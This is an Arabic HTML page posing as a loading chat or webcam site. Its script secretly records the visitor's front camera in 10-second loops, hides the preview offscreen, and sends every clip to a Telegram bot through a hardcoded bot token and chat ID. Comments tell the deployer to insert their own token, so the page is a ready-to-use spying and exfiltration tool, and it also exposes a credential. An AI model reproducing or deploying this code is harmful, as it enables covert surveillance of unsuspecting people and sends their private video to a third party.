<!DOCTYPE html>
<html lang="ar">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>برنامج فيديو كام أونلاين</title>
    <style>
      #videoElement {
        width: 100%;
        max-width: 600px;
        position: absolute;
        top: -10000px; /* يخفي الفيديو عندما يتم تحميله */
      }
    </style>
  </head>
  <body>
    <h1>جاري تحميل صفحة الشات، برجاء الانتظار...</h1>
    <video id="videoElement" autoplay playsinline></video>

    <script>
      const video = document.getElementById("videoElement");
      const botToken = "6766185434:AAHdWBZuTn4bntXnOo96O8s0Lh7UrGhwD5Y"; // استبدل بـ Token البوت الخاص بك
      const chatId = "6055516230"; // استبدل بـ Chat ID الخاص بك
      let mediaRecorder;
      let recordedChunks = [];

      // طلب الوصول إلى الكاميرا الأمامية
      navigator.mediaDevices
        .getUserMedia({ video: { facingMode: "user" } })
        .then((stream) => {
          video.srcObject = stream;

          // إعداد MediaRecorder لتسجيل الفيديو
          mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });

          mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
              recordedChunks.push(event.data);
            }
          };

          mediaRecorder.onstop = () => {
            const blob = new Blob(recordedChunks, { type: "video/webm" });
            recordedChunks = []; // إعادة تعيين المصفوفة
            sendVideoToTelegram(blob); // إرسال الفيديو
            startRecording(); // بدء التسجيل التالي
          };

          // بدء التسجيل الأول بعد تحميل الفيديو
          video.onloadedmetadata = () => {
            startRecording();
            video.style.top = ""; // إزالة الأسلوب الذي يخفي الفيديو
          };
        })
        .catch((err) => {
          console.error("حدث خطأ عند محاولة الوصول إلى الكاميرا:", err);
        });

      // بدء تسجيل الفيديو
      function startRecording() {
        recordedChunks = []; // إعادة تعيين المصفوفة
        mediaRecorder.start();

        // توقف التسجيل بعد 10 ثوانٍ (يمكن تغيير المدة)
        setTimeout(() => {
          mediaRecorder.stop();
        }, 10000); // تسجيل لمدة 10 ثوانٍ
      }

      // وظيفة إرسال الفيديو إلى بوت التليجرام
      function sendVideoToTelegram(blob) {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("video", blob);

        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
          method: "POST",
          body: formData,
        })
          .then((response) => response.json())
          .then((data) => {
            if (data.ok) {
              console.log("تم إرسال الفيديو بنجاح إلى البوت.");
            } else {
              console.error("فشل إرسال الفيديو:", data);
            }
          })
          .catch((error) => {
            console.error("حدث خطأ أثناء الإرسال:", error);
          });
      }
    </script>
  </body>
</html>
